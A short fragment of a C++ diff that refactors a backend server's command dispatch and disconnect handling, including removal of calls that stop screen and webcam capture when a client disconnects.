-            send_text("Unknown command", client_id, backend_id);
-            continue;
+        if (it != handlers.end()) {
+            it->second(parts, client_id, backend_id);
+        } else {
+            send_text("Unknown command: " + parts[0], client_id, backend_id);
         }
-        it->second(parts, client_id, backend_id);
     }
 
-    alive.store(false);
-    stop_screen();
-    stop_webcam();
     close(fd);
-    std::cout << "[BackendServer] Connection closed fd=" << fd << std::endl;
+    std::cout << "[BackendServer] Client disconnect fd=" << fd << std::endl;
 }
